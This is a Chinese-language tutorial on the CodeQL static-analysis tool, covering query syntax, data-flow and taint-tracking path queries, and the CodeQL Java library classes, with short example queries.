SDK\u5219\u662f\u8bb8\u591a\u7f16\u5199\u597d\u7684\u89c4\u5219\uff0c\u5b8c\u5168\u5f00\u6e90\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7528\u73b0\u6210\u7684SDK\u6765\u7f16\u5199\u89c4\u5219\u3002 \u73af\u5883\u642d\u5efa\u4e0e\u542f\u52a8 \u4e00\u822c\u6765\u8bf4\uff0c\u73af\u5883\u642d\u5efa\u7684\u64cd\u4f5c\u662f \u5148\u5728github\u4e0a\u4e0b\u8f7dcodeql\u672c\u4f53\uff0c\u518d\u4e0b\u8f7dql\u8fd9\u4e2asdk\uff0c\u7136\u540e\u518d\u5b8c\u6210vscode\u7684codeql\u63d2\u4ef6\u5b89\u88c5\u3002 \u542f\u52a8codeql\u5206\u6790\u4ee3\u7801\u7684\u64cd\u4f5c\u662f \u5148\u751f\u6210\u76ee\u6807\u9879\u76ee\u6587\u4ef6\u7684\u6570\u636e\u5e93\u6587\u4ef6 \uff0c\u7136\u540e\u518d\u7528codeql\u5bf9\u5176\u8fdb\u884c\u5206\u6790\u3002 \u8fd9\u91cc\u5f15\u7528\u4e00\u4e0bfreebuf\u4e0a\u5173\u4e8ecodeql\u5206\u6790\u4ee3\u7801\u6b65\u9aa4\u7684\u4e00\u4e2a\u56fe\u7247\uff0c\u4e0d\u96be\u53d1\u73b0codeql\u662f\u57fa\u4e8e\u4ee3\u7801\u751f\u6210\u7684\u6570\u636e\u5e93\u8fdb\u884c\u5206\u6790\u7684\u3002 \u5177\u4f53\u642d\u5efa\u64cd\u4f5c\u7f51\u4e0a\u6709\u5f88\u591a\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u8d58\u8ff0\u4e86\uff0c\u73b0\u6210\u7684\u73af\u5883\u642d\u5efa\u7684\u6587\u7ae0\u5728\u8fd9\u91cc\u63a8\u8350\u51e0\u7bc7\u3002 \u751f\u6210\u6570\u636e\u5e93 codeql database create database_name -l java https://me.xxf.world/post/codeql-huan-jing-da-jian/ https://www.freebuf.com/articles/web/283795.html \u57fa\u672c\u8bed\u6cd5\u3001\u6982\u5ff5 \u53ea\u662f\u7b80\u5355\u7684\u804a\u804a\u6982\u5ff5\uff0c\u5e76\u4e0d\u4f1a\u5f88\u6df1\u5165\u4e25\u8c28 \u7531\u4e8e\u7b14\u8005\u66f4\u6ce8\u91cd\u4e8ecodeql\u5728java\u4e2d\u7684\u4f7f\u7528\uff0c\u6240\u4ee5\u5728codeql-java\u5c0f\u8282\u4e2d\u4f1a\u6709\u66f4\u52a0\u6df1\u5165\u7684\u4e00\u4e9b\u53d9\u8ff0\u3002 ref: https://codeql.github.com/docs/writing-codeql-queries/codeql-queries/ \u57fa\u672c\u67e5\u8be2\u7ed3\u6784 /** * * Query metadata * */ import /* ... CodeQL libraries or modules ... */ /* ... Optional, define CodeQL classes and predicates ... */ from /* ... variable declarations ... */ where /* ... logical formula ... */ select /* ... expressions ... */ metadata \u7b80\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u8fd9\u6bb5\u67e5\u8be2\u7684\u5143\u6570\u636e\uff08\u5e9f\u8bdd\uff09\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u5143\u6570\u636e\u53bb\u5b9a\u4e49\u7ed3\u679c\u7684\u5c55\u793a\u3001\u63d0\u4f9b\u67e5\u8be2\u76ee\u7684\u7684\u76f8\u5173\u4fe1\u606f\u3001\u4e3a\u8fd9\u6bb5\u67e5\u8be2\u63d0\u4f9b\u8fa8\u8bc6\u7b26 \u7b49\u3002 \u867d\u7136\u5728\u6ce8\u91ca\u4e2d\uff0c\u4f46\u662fmetadata\u4f9d\u65e7\u80fd\u591f\u5f71\u54cd\u67e5\u8be2\u672c\u8eab\u3002 metadata\u7684\u4e00\u4e9b\u952e\u503c\u7ed3\u6784 https://codeql.github.com/docs/writing-codeql-queries/metadata-for-codeql-queries/ import statements \u7528\u4e8e\u5f15\u5165\u4f9d\u8d56\uff08.qll\u6587\u4ef6\uff09\u548c\u6a21\u5757 classes and predicates \u5b9a\u4e49\u7c7b\u7684\u8c13\u8bed from where select from\u4ece\u53e5\u540e\u9762\u8ddf\u53d8\u91cf\uff08\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u96c6\u5408\uff09 \uff0c\u6bd4\u5982 from Method a \uff0c\u5c31\u662f\u83b7\u53d6\u6240\u6709\u65b9\u6cd5\uff0c\u7136\u540e\u5c06\u83b7\u53d6\u5230\u7684\u65b9\u6cd5\u7684\u96c6\u5408\u547d\u540d\u4e3aa where\u4ece\u53e5\u540e\u8ddf\u9650\u5236\u6761\u4ef6\uff08\u96c6\u5408\u3001\u8c13\u8bed\u3001\u516c\u5f0f\uff09\uff0c\u5c06\u53d8\u91cf\uff08\u96c6\u5408\uff09\u9650\u5236\u4e3a\u66f4\u5c0f\u7684\u96c6\u5408 select\u5c55\u793a\u88abwhere\u4ece\u53e5\u4fee\u9970\u8fc7\u540e\u7684\u96c6\u5408\u7684\u7ed3\u679c \u5176\u4e2d\u5173\u4e8eselect\u53ef\u4ee5\u5ef6\u4f38\u51fa \u201c\u600e\u6837\u8fd4\u56de\u7ed3\u679c\u201d\u8fd9\u4e2a\u95ee\u9898\u3002 select\u4ece\u53e5\u53ef\u4ee5\u4f20\u5165\u4e24\u79cd\u503c\uff0c\u4e00\u4e2a\u662fElement\uff08\u5982\u53d8\u91cf\uff09\uff0c\u4e00\u4e2a\u662fString\uff08\u5b57\u7b26\u4e32\uff09\u3002\u540c\u65f6\u5b57\u7b26\u4e32\u4e5f\u53ef\u4ee5\u4e0eElement\u8fdb\u884c\u62fc\u63a5\u8f93\u51fa\u3002\u5c31\u50cf\u8fd9\u6837 import java from Method a where a.getName().length()=5 select a.getLocation(),\"methodname: \"+a.getName() \u4e5f\u53ef\u4ee5\u901a\u8fc7\u5360\u4f4d\u7b26\\$@. \u8fdb\u884c\u683c\u5f0f\u5316\u8f93\u51fa. \u540c\u65f6\u5728codeql\u4e2d\u4e5f\u5b58\u5728\u7740\u4e09\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u63d0\u4f9b\u8fd4\u56de\u7ed3\u679c\u4e2d\u7684\u5143\u7d20\u7684\u4f4d\u7f6e\u3002 \u5b83\u4eec\u6309\u8c03\u7528\u7684\u4f18\u5148\u987a\u5e8f\u5206\u522b\u662f Providing URLs \uff1a\u63d0\u4f9bURL\uff0c\u5982\u679c\u662ffile://\u534f\u8bae\uff0c\u5c31\u4f1a\u540c\u65f6\u5728URL\u540e\u56de\u8ddf4\u4e2a\u6570\u5b57\uff0c\u6570\u5b57\u4e0e\u6570\u5b57\u4e4b\u95f4\u3001\u6570\u5b57\u4e0eURL\u4e4b\u95f4\u7528\u5206\u53f7\u9694\u5f00\uff0c\u6570\u5b57\u4ece\u5de6\u5411\u53f3\u4ee3\u8868 \u5143\u7d20\u5728\u6587\u4ef6\u4e2d\u7684 \u5f00\u59cb\u884c\uff1a\u5f00\u59cb\u5217\uff1a\u7ed3\u675f\u884c\uff1a\u7ed3\u675f\u5217\uff0c\u5982\uff1a file://opt/src/my/file.java:12:1:13:0 \u5176\u4e2d0:0:0:0 \u4ee3\u8868\u6574\u4e2a\u6587\u4ef6\u5185\u5bb9 1:0:1:0 \u4ee3\u8868\u7b2c\u4e00\u884c\u7684\u5185\u5bb9 \u4e0d\u52a0\u7ed3\u5c3e\u7684\u6570\u5b57\u4e5f\u4ee3\u8868\u6574\u4e2a\u6587\u4ef6\u5185\u5bb9\u3002\u8fd9\u4e2aURL\u4ece\u8c13\u8bcd\u7684getURL()\u65b9\u6cd5\u83b7\u53d6\u3002 Providing location information \uff1a\u5f53getURL\u8c13\u8bcd\u4e0d\u5b58\u5728\u65f6\uff0c\u4f1a\u8c03\u7528hasLocationInfo\u3002\u8be5\u673a\u5236\u4e0d\u4f1a\u751f\u6210getURL\u90a3\u6837\u5197\u957f\u7684URL\uff0c\u800c\u662f\u66f4\u7b80\u6d01\u7684URL\u3002(\u4e0d\u592a\u61c2 Using extracted location information \uff1a\u5f53\u4ee5\u4e0a\u4e24\u4e2a\u65b9\u6cd5\u90fd\u4e0d\u5b58\u5728\u65f6\u8c03\u7528\u8fd9\u4e2a\uff0c\u4f1a\u4ece\u6570\u636e\u5e93\u62fe\u8d77\u5df2\u6709\u7684\u4fe1\u606f \u67e5\u8be2 codeql\u6709\u4e24\u79cd\u67e5\u8be2 Alert queries : queries that highlight issues in specific locations in your code.\uff08\u67e5\u8be2\u7279\u5b9a\u7684\u67d0\u4e2a\u70b9\uff0c\u5982\u83b7\u53d6\u7279\u5b9a\u65b9\u6cd5\u540d\uff09metadata\u4e2d\u6ce8\u660e @kind problem Path queries : queries that describe the flow of information between a source and a sink in your code.\uff08\u901a\u8fc7source\u3001sink\u6765\u67e5\u627e\u4e4b\u95f4\u7684\u901a\u8def\uff09 @kind proble-path \u6570\u636e\u6d41\u5206\u6790 codeql\u5b98\u65b9\u6587\u6863\u5bf9\u6570\u636e\u6d41\u5206\u6790\u7684\u5b9a\u4e49 \"Data flow analysis is used to compute the possible values that a variable can hold at various points in a program, determining how those values propagate through the program and where they are used.\" \u6570\u636e\u6d41\u5206\u6790\u7528\u4e8e\u8ba1\u7b97\u4e00\u4e2a\u53d8\u91cf\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u6240\u6709\u6709\u53ef\u80fd\u5f97\u5230\u7684\u503c\uff0c\u5206\u6790\u8fd9\u4e9b\u503c\u662f\u5982\u4f55\u5728\u7a0b\u5e8f\u4e2d\u4f20\u64ad\u7684\uff0c\u4ee5\u53ca\u8fd9\u4e9b\u503c\u5728\u54ea\u91cc\u88ab\u7528\u5230\u8fc7\u3002 codeql\u7684\u8bb8\u591a\u67e5\u8be2\u90fd\u57fa\u4e8e\u6570\u636e\u6d41\u5206\u6790\u3002 codeql\u7684\u6570\u636e\u6d41\u5206\u6790\u662f\u57fa\u4e8e\u7a0b\u5e8f\u5efa\u6a21\u5f97\u6765\u7684\u6570\u636e\u6d41\u56fe\u7684\u3002 ** \u6570\u636e\u6d41\u56fe ** \u6570\u636e\u6d41\u56fe \u60f3\u8981\u521b\u5efa\u4e00\u4e2a\u51c6\u786e\u4e14\u5168\u9762\u7684\u6570\u636e\u6d41\u56fe\u4f1a\u9762\u4e34\u4e0b\u9762\u7684\u51e0\u4e2a\u96be\u9898 \u6709\u4e9b\u5e93\u51fd\u6570\u6e90\u7801\u662f\u95ed\u6e90\u7684\uff0c\u65e0\u6cd5\u5bf9\u6e90\u7801\u8fdb\u884c\u5efa\u6a21 \u6709\u4e9b\u884c\u4e3a\u662f\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u624d\u4f1a\u5c55\u73b0\u51fa\u6765\u7684 \u4ee3\u7801\u4e2d\u53d8\u91cf\u7684\u522b\u540d\u4f1a\u7ed9\u5206\u6790\u5e26\u6765\u56f0\u6270 \u6570\u636e\u6d41\u56fe\u751f\u6210\u4f1a\u5f88\u5927\uff0c\u8ba1\u7b97\u5206\u6790\u8d77\u6765\u901f\u5ea6\u5f88\u6162 \u4e3a\u4e86\u89e3\u51b3\u4e0a\u9762\u7684\u96be\u9898\uff0c\u73b0\u5728\u6709\u4e24\u79cd\u4e0d\u540c\u7684\u5efa\u6a21\u624b\u6bb5\u53ef\u4f9b\u6211\u4eec\u9009\u62e9 \u5c40\u90e8\u6570\u636e\u6d41\uff1a\u6570\u636e\u6d41\u56fe\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u8fb9\uff0c\u53ea\u8003\u8651\u5728\u540c\u4e00\u4e2a\u65b9\u6cd5\u5185\u3002\u4e5f\u5c31\u662f\u53ea\u8003\u8651\u53d8\u91cf\u5728\u4e00\u4e2a\u65b9\u6cd5\u5185\u7684\u6570\u636e\u6d41\u5411\uff0c\u5ffd\u7565\u5728\u4e0d\u540c\u65b9\u6cd5\u4e4b\u95f4\u548c\u5bf9\u8c61\u5c5e\u6027\u4e2d\u7684\u6570\u636e\u6d41\u5411\u3002\u5b83\u7684\u901f\u5ea6\u5f88\u5feb\u800c\u4e14\u5f88\u7cbe\u786e\uff0c\u800c\u4e14\u66f4\u7b80\u5355\uff0c\u5bf9\u4e8e\u5f88\u591a\u95ee\u9898\u5b83\u5df2\u7ecf\u8db3\u591f\u7528\u4e86\u3002 \u5168\u5c40\u6570\u636e\u6d41\uff1a\u672c\u5730\u6570\u636e\u6d41\u8003\u8651\u548c\u4e0d\u8003\u8651\u7684\u6570\u636e\u6d41\u5411\uff0c\u5b83\u90fd\u8003\u8651\u4e86\u3002\u4e5f\u5c31\u662f\u8bf4\u5b83\u4f1a\u5bf9\u6574\u4e2a\u9879\u76ee\u8fdb\u884c\u5efa\u6a21\uff0c\u5b83\u66f4\u8d39\u65f6\u4f46\u662f\u66f4\u52a0\u5168\u9762 ** \u6570\u636e\u6d41\u548c\u6c61\u70b9\u8ffd\u8e2a ** \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5728\u8ffd\u8e2a\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u5bf9\u8c61 X\u3002 \u968f\u7740\u7a0b\u5e8f\u7684\u8fdb\u884c\uff0cX\u6765\u5230\u4e86\u8fd9\u6837\u7684\u4ee3\u7801\u4e2d\uff1a y=X+1\u3002 \u7531\u4e8ey\u662f\u7531X\u6d3e\u751f\u7684\uff0c\u5b83\u88abX\u611f\u67d3\u5f71\u54cd\u4e86\uff0c\u6240\u4ee5\u5b83\u4e5f\u5df2\u7ecf\u6210\u4e3a\u4e86\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u5bf9\u8c61 \u4f20\u7edf\u7684\u6570\u636e\u6d41\u5206\u6790\u4f1a\u7740\u91cd\u4e8eX\u672c\u8eab\uff0c\u800c\u4e0d\u4f1a\u6ce8\u610f\u5230y\uff0c\u5b83\u53ef\u80fd\u4f1a\u53ea\u6ce8\u610fX\u6709\u53ef\u80fd\u6210\u4e3a\u54ea\u4e9b\u503c\u3002 \u800c\u6c61\u70b9\u8ddf\u8e2a\u5219\u4f1a\u5206\u6790y\uff0c\u56e0\u4e3ay\u4e5f\u88ab\u6c61\u70b9\u6240\u6c61\u67d3\u4e86\uff0c\u5206\u6790\u6c61\u70b9\u4ecex\u6d41\u5411y\u7684\u8fc7\u7a0b\u4fbf\u662f\u6c61\u70b9\u8ffd\u8e2a Path queries \u5728\u4e0a\u9762\u7684\u5c0f\u8282\u4e2d\u7b80\u5355\u53d9\u8ff0\u4e86\u5173\u4e8e Path queries \u548c Alert queries path queries\u5728\u6f0f\u6d1e\u6316\u6398\u4e2d\u662f\u5f88\u6709\u7528\u7684\u3002\u8bb8\u591a\u5b89\u5168\u95ee\u9898\u662f\u56e0\u4e3a\u6570\u636e\u4ece\u5f00\u59cb\u7aef\u70b9\u6d41\u5165\u7a0b\u5e8f\uff08source\uff09\uff0c\u76f4\u5230\u6d41\u5165\u6700\u540e\u4f1a\u9020\u6210\u5b89\u5168\u98ce\u9669\u7684\u7aef\u70b9\uff08sink\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u5728codeql\u4e2d\u63d0\u4f9bsource\u548csink\u7684\u4fe1\u606f\u6765\u67e5\u627e\u4ecesource\u5230sink\u7684\u8def\u5f84\u3002 path queries \u6a21\u677f\u5982\u4e0b /** * ... * @kind path-problem //path queries\u9700\u8981\u6709\u8fd9\u4e2ametadata * ... */ import <language> // For some languages (Java/C++/Python) you need to explicitly import the data flow library, such as // import semmle.code.java.dataflow.DataFlow import DataFlow::PathGraph ... from MyConfiguration config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select sink.getNode(), source, sink, \"<message>\" \u5176\u4e2d\uff0cDataFlow::PathGraph \u662f\u5f15\u5165\u7684\u4e00\u4e2a\u6a21\u5757 DataFlow::PathNode source, DataFlow::PathNode sink \u5206\u522b\u662fPathGraph\u4e2d\u7684\u8fde\u4e2a\u8282\u70b9 MyConfiguration \u662f\u6211\u4eec\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u4e00\u4e2a\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u5b9e\u73b0\u4e86source\u548csink\u7684\u5b9a\u4e49\u3002 \u5f15\u5165\u6a21\u5757 \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u5f15\u5165\u4e86 DataFlow::PathGraph\uff0c\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f \u8fd9\u5c31\u9700\u8981\u8bb2\u5230\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u8def\u5f84\u662f\u5982\u4f55\u751f\u6210\u7684\u4e86\u3002 \u5982\u679c\u6211\u4eec\u4e0d\u7528DataFlow::PathGraph\u8fd9\u79cd\u989d\u5916\u7684\u6a21\u5757\uff0c\u60f3\u8981\u83b7\u53d6\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u8def\u5f84\uff0c\u5c31\u9700\u8981\u6211\u4eec\u81ea\u5df1\u5b9a\u4e49\u4e00\u4e2a\u540d\u4e3a query predicate \u7684\u8c13\u8bcd\uff0c\u5b83\u957f\u8fd9\u6837 query predicate edges(PathNode a, PathNode b) { /** Logical conditions which hold if `(a,b)` is an edge in the data flow graph */ } \u5b83\u4f1a\u6839\u636e\u8c13\u8bcd\u91cc\u7ed9\u5b9a\u7684\u903b\u8f91\u518d\u7ed3\u5408\u6570\u636e\u6d41\u56fe\uff0c\u751f\u6210\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u8fb9\u3002 \u4f46\u8fd9\u6837\u592a\u9ebb\u70e6\u4e86\uff0c\u6240\u4ee5\u5c31\u5f15\u5165\u4e86DataFlow::PathGraph\u8fd9\u79cd\u6a21\u5757\uff0c\u8fd9\u79cd\u6a21\u5757\u5185\u90e8\u5b9a\u4e49\u4e86edges\u8c13\u8bcd\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u62ff\u6765\u7528\u3002 \u6307\u5b9asource\u3001sink \u5728\u4e00\u4e2apath query\u91cc\uff0c\u6307\u5b9asource\u548csink\u662f\u5fc5\u987b\u7684\u3002 \u8981\u6307\u5b9asource\u548csink\uff0c\u9700\u8981\u5b9a\u4e00\u4e2a\u7ee7\u627f\u81eaTaintTracking::Configuration\u7684\u7c7b\uff0c\u5e76\u4e14\u91cd\u5199isSource\u3001isSink\u65b9\u6cd5 class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\" } override predicate isSource(DataFlow::Node src) { /*\u6307\u5b9asource node */ } override predicate isSink(DataFlow::Node sink) { /*\u6307\u5b9asink node */ } } \u9009\u62e9\u8282\u70b9 \u6700\u540e\u6211\u4eec\u4f1a\u7528from ...where...select... \u6765\u6307\u5b9a \u4ecesource\u6d41\u5411sink\u7684\u8282\u70b9\u8def\u5f84 from Configuration config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select element, source, sink, string from \u9009\u62e9\u4e86\u4e09\u4e2a\u4e1c\u897f\uff1a\u4e00\u4e2aConfiguration\u53d8\u91cf\uff08Configuration\u7c7b\u5373\u6211\u4eec\u5b9a\u4e49source\u3001sink\u65f6\u521b\u5efa\u7684\u7c7b\uff09\uff0c\u4ee5\u53ca\u4e24\u4e2aPathNode\u5206\u522b\u4ee3\u8868source\u548csink\u8282\u70b9 \u7136\u540e\u4f7f\u7528where\u5b50\u53e5\u8c03\u7528config.hasFlowPath \u6765\u9650\u5236source\u5230sink\u7684\u6d41\u662f\u7b26\u5408\u6211\u4eec\u5b9a\u4e49\u7684Configuration\u7c7b\u4e2d\u6240\u89c4\u8303\u7684 \u7136\u540e\u4f7f\u7528select\u5b50\u53e5\u9009\u62e9\u7b26\u5408\u4eec\u5b9a\u4e49\u7684Configuration\u7c7b\u4e2d\u6240\u89c4\u8303\u7684source\u8282\u70b9\u548csink\u8282\u70b9\uff0c\u6211\u4eec\u9664\u6b64\u4e4b\u5916\u8fd8\u53ef\u4ee5\u9009\u62e9\u5143\u7d20\u548c\u5b57\u7b26\u4e32\u7b49\u6570\u636e\u3002 Codeql-java java\u5e93 \u56e0\u4e3a\u6211\u5b66codeql\u7684\u4e3b\u8981\u76ee\u7684\u662f\u6316\u6398java\u6f0f\u6d1e\uff0c\u6240\u4ee5\u6211\u4f1a\u66f4\u5173\u5fc3codeql\u5728java\u4e2d\u7684\u5e94\u7528\u3002 codeql\u4e2d\u7684java\u6838\u5fc3\u4f9d\u8d56\u7c7b\u5e93\u662fjava.qll\uff0c\u6211\u4eec\u4f7f\u7528\u65f6\u76f4\u63a5import java\u5373\u53ef\u3002 \u5b83\u4e3b\u8981\u6709\u4e94\u79cd\u7c7b\u578b\u7684\u7c7b 1.Element\u4ee3\u8868\u9879\u76ee\u4e2d\u7684\u5143\u7d20\uff08\u7c7b\u3001\u65b9\u6cd5\u7b49\uff09 2.ASTNode\u4ee3\u8868AST\u8282\u70b9\uff08statements\u548c\u8868\u8fbe\u5f0f\u7b49\uff09 3.metadata\u4ee3\u8868\u5143\u6570\u636e\uff08\u6ce8\u91ca\u7b49\uff09 4.metrics\u8ba1\u7b97\u6307\u6807\uff0c\u4f8b\u5982\u5faa\u73af\u590d\u6742\u5ea6 5.Call Gragh\u4ee3\u8868\u9879\u76ee\u7684\u8c03\u7528\u56fe\uff0c\u6216\u8005\u8bf4\u8c03\u7528\u5173\u7cfb \u5143\u7d20Element java\u5e93\u4e2d\u5bf9Element\u7c7b\u7684\u7ee7\u627f\u5173\u7cfb\u5982\u4e0b \u6709\u4e00\u4e9b\u5b98\u65b9\u6587\u6863\u63d0\u5230\u7684\u6982\u5ff5\uff0c\u5728\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b Type\uff08\u7c7b\u578b\uff09 PrimitiveType \u4e3b\u6570\u636e\u7c7b\u578b\uff1a boolean, byte, char, double, float, int, long, short, void, \\ , null RefType \u5f15\u7528\u7c7b\u578b\uff1a Class\u3001Interface\u3001EnumType\u3001Array TopLevelType :\u5b9a\u4e49\u5728\u4e00\u4e2ajava\u5305\u4e2d\u6700\u9ad8\u5c42\u7684Type\uff08\u5305\u62ecclass\u3001interface\u7b49\uff09 NestedType :\u9664 TopLevelType \u4ee5\u5916\u7684Type\uff0c\u5982\u533f\u540dclass\u7b49 TopLevelClass \u5b9a\u4e49\u5728\u4e00\u4e2ajava\u5305\u4e2d\u6700\u9ad8\u5c42\u7684class\uff0c\u662f TopLevelType \u7684\u5b50\u7c7b NestedClass \u9664 NestedClass \u4ee5\u5916\u7684class\uff0c\u5982\u533f\u540dclass\uff0c\u4e00\u4e2a\u7c7b\u7684\u5185\u90e8\u5b9a\u4e49\u7684class\u7b49\uff0c\u662f NestedType \u5b50\u7c7b \u4e0b\u9762\u662f\u5173\u4e8e\u4ee5\u4e0a\u6982\u5ff5\u7684\u4e00\u4e9bcodeql\u67e5\u8be2\u8bed\u53e5 TopLevelType import java from TopLevelType tl where tl.getName() != tl.getCompilationUnit().getName() select tl \u6211\u8ba4\u4e3a\u8fd9\u6bb5ql\u4ee3\u7801\u662f\u53bb\u67e5\u8be2\u6240\u6709\u5305\u540d\u548cType\u540d\u4e0d\u4e00\u81f4\u7684TopLevelType \u5982\u4f1a\u67e5\u8be2\u51fa\u8fd9\u79cdclass\uff1aNioQueueSubscriptionTestListener package org.apache.activemq.broker; /*code*/ class NioQueueSubscriptionTestListener implements ExceptionListener { /*code*/ \u6216\u8005\u8fd9\u6837\u7684interface package org.apache.activemq.bugs; /*code*/ interface Configurer { public void configure(BrokerService broker) throws Exception; } import java from NestedClass nc where nc.getASupertype() instanceof TypeObject select nc \u6211\u8ba4\u4e3a\u8fd9\u6bb5ql\u4ee3\u7801\u53bb\u67e5\u8be2\u6240\u6709\u76f4\u63a5\u7ee7\u627f\u81eaObject\u7684NestedClass \u3002 \u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u6ca1\u6709extends\u8bed\u53e5\u7684\u7c7b\uff08\u4f46\u8fd8\u662f\u4f1a\u67e5\u8be2\u5230implements \u8bed\u53e5\uff09 \u8fd9\u4e0d\u7981\u8ba9\u6211\u601d\u8003extends\u548cimplements \u7684\u533a\u522b\uff1a \u3000Extends\u53ef\u4ee5\u7406\u89e3\u4e3a\u5168\u76d8\u7ee7\u627f\u4e86\u7236\u7c7b\u7684\u529f\u80fd\u3002implements\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e3a\u8fd9\u4e2a\u7c7b\u9644\u52a0\u4e00\u4e9b\u989d\u5916\u7684\u529f\u80fd\uff1b \u3000interface\u5b9a\u4e49\u4e00\u4e9b\u65b9\u6cd5,\u5e76\u6ca1\u6709\u5b9e\u73b0,\u9700\u8981implements\u6765\u5b9e\u73b0\u624d\u53ef\u7528\u3002 \u3000extend\u53ef\u4ee5\u7ee7\u627f\u4e00\u4e2a\u63a5\u53e3,\u4f46\u4ecd\u662f\u4e00\u4e2a\u63a5\u53e3,\u4e5f\u9700\u8981implements\u4e4b\u540e\u624d\u53ef\u7528\u3002 \u3000\u5bf9\u4e8eclass\u800c\u8a00\uff0cExtends\u7528\u4e8e(\u5355)\u7ee7\u627f\u4e00\u4e2a\u7c7b\uff08class\uff09\uff0c\u800cimplements\u7528\u4e8e\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3(interface)\u3002 \u3000\u2014\u2014\u2014\u2014https://cloud.tencent.com/developer/article/1074987\u300a\u6d45\u8c08java\u4e2dextends\u4e0eimplements\u7684\u533a\u522b\u300b Generics\uff08\u6cdb\u578b\uff09 codeql\u4e2d\u6cdb\u578b\u7528 GenericType \u8868\u793a\uff0c\u5b83\u6709\u5b50\u7c7b GenericInterface \u548c GenericClass \u5206\u522b\u8868\u793a\u6240\u6709\u6cdb\u578b\u63a5\u53e3\u548c\u6cdb\u578b\u7c7b\u3002 \u5f53\u6cdb\u578b\u7c7b\u5df2\u7ecf\u4f20\u5165\u7279\u5b9a\u7c7b\u578b\u7684\u53d8\u91cf\u8fdb\u884c\u53c2\u6570\u5316\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 ParameterizedType \u6765\u8868\u793a\u6240\u6709\u53c2\u6570\u5316\u540e\u7684\u6cdb\u578b\u793a\u4f8b\uff0c\u6bd4\u5982List\\ \u6216\u8005List\\ \u5c31\u662f\u53c2\u6570\u5316\u540e\u7684\u6cdb\u578b\u3002\u5bf9\u4e8e ParameterizedType \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u5176\u5185\u90e8\u65b9\u6cd5 getSourceDeclaration \u6765\u83b7\u5f97\u5b83\u5bf9\u5e94\u7684 GenericType \u3002 TypeVariable \u4ee3\u8868\u6cdb\u578b<>\u4e2d\u7684\u53d8\u91cf\uff0cTypeBound \u4ee3\u8868\u8fd9\u4e9b\u53d8\u91cf\u7684\u8303\u56f4\uff0c\u5982 \\ \u90a3\u4e48N\u7684Bound\u5c31\u662fNumber\u3002TypeBound\u6211\u4eec\u53ef\u4ee5\u7528getType\u65b9\u6cd5\u6765\u83b7\u53d6\u8fd9\u4e2a\u8303\u56f4\u3002 \u6bcf\u4e00\u4e2a\u6cdb\u578b\u90fd\u6709\u4e00\u4e2a\u65e0\u53c2\u7248\uff0c\u6211\u4eec\u7528RawType\u8868\u793a\uff0c\u6bd4\u5982List\\ \u7684RawType\u5c31\u662fList<>\uff0cRawType\u6709\u4e24\u4e2a\u5b50\u7c7bRawClass\u548cRawInterface\u3002\u6211\u4eec\u53ef\u4ee5\u7528 getSourceDeclaration\u83b7\u53d6GenericType Variables\uff08\u53d8\u91cf\uff09 \u7528 Variable \u8868\u793a\u3002\u5176\u6709\u4e09\u4e2a\u5b50\u7c7b\u5206\u522b\u4e3a Field \u7c7b\u91cc\u9762\u7684\u6210\u5458\u53d8\u91cf LocalVariableDecl \u672c\u5730\u53d8\u91cf Parameter \u65b9\u6cd5\u7684\u53c2\u6570 \u62bd\u8c61\u8bed\u6cd5\u6811 ast codeql java\u5e93\u4e2d\u628aAST\u8282\u70b9\u5206\u4e3a\u4e86statements\uff08Stmt\uff09\u548cexpressions (Expr\uff09\u3002\u524d\u8005\u4ee3\u8868\u7740\u8bed\u53e5\u7ed3\u6784\uff0c\u540e\u8005\u4ee3\u8868\u7740\u5177\u4f53\u7684\u503c\u3002 \u8fd9\u662f\u8be6\u7ec6\u4ecb\u7ecd Abstract syntax tree classes for working with Java programs Expr.getAChildExpr \u8fd4\u56de\u7ed9\u5b9a\u8868\u8fbe\u5f0f\u7684\u5b50\u8868\u8fbe\u5f0f Stmt.getAChild \u8fd4\u56de\u7ed9\u5b9a\u8bed\u53e5\u5757\u7684\u5b50\u8868\u8fbe\u5f0f\u6216\u5b50\u8bed\u53e5\u5757 Expr.getParent and Stmt.getParent \u8fd4\u56de\u7236\u8282\u70b9\uff0c\u8868\u8fbe\u5f0f\u7684\u7236\u8282\u70b9\u4e0d\u4e00\u5b9a\u662f\u8868\u8fbe\u5f0f\uff0c\u8bed\u53e5\u5757\u7684\u7236\u8282\u70b9\u4e5f\u4e0d\u4e00\u5b9a\u662f\u8bed\u53e5\u5757\u3002 \u5b98\u65b9\u6587\u6863\u793a\u4f8b import java from Expr e where e.getParent() instanceof ReturnStmt select e \u83b7\u53d6\u6240\u6709\u7236\u8282\u70b9\u662fReturnStmt\u7684\u8868\u8fbe\u5f0f \u5143\u6570\u636e metadata \u4e00\u822c\u5305\u62ec\u4ee3\u7801\u4e2d\u7684\u6ce8\u89e3\uff08 annotations \uff0c\u5982@overriede\uff09\u548cJavadoc\u6ce8\u89e3\u3002 